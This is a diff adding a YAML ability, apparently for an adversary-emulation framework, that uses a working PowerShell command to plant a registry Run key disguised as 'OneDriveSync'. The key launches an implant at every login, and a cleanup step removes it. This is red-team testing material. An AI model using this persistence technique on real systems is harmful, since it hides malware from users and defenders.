@@ -1,0 +1,40 @@
+---
+- id: scn003-a3-registry-persistence
+  name: "SCN-003 | Establish Persistence via Registry Run Key"
+  description: |
+    Writes a Run key entry to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    disguised as "OneDriveSync" to execute the implant at every user login.
+    Provides redundant persistence alongside the scheduled task — if one is
+    discovered and removed, the other survives. Native Windows only.
+    Maps to T1547.001 (Registry Run Keys / Startup Folder).
+  tactic: persistence
+  technique:
+    attack_id: T1547.001
+    name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "=== REGISTRY RUN KEY PERSISTENCE (T1547.001) ===";
+          $keyPath   = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";
+          $valueName = "OneDriveSync";
+          $payload   = "$env:APPDATA\Microsoft\OneDrive\onedrive_sync.exe";
+          Set-ItemProperty -Path $keyPath -Name $valueName -Value $payload -Force;
+          Write-Output "";
+          Write-Output "[*] Verifying Run key was written:";
+          $check = Get-ItemProperty -Path $keyPath -Name $valueName -ErrorAction SilentlyContinue;
+          if ($check) {
+            Write-Output "  [+] SUCCESS";
+            Write-Output "  Key   : $keyPath";
+            Write-Output "  Name  : $valueName";
+            Write-Output "  Value : $($check.$valueName)"
+          } else {
+            Write-Output "  [-] FAILED — check permissions"
+          };
+          Write-Output "";
+          Write-Output "[*] Disguised as: OneDriveSync (Microsoft OneDrive component)";
+          Write-Output "[*] Trigger: Every user login";
+          Write-Output "=== PERSISTENCE ESTABLISHED ==="
+        cleanup: |
+          Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDriveSync" -Force -ErrorAction SilentlyContinue;
+          Write-Output "Registry Run key removed"
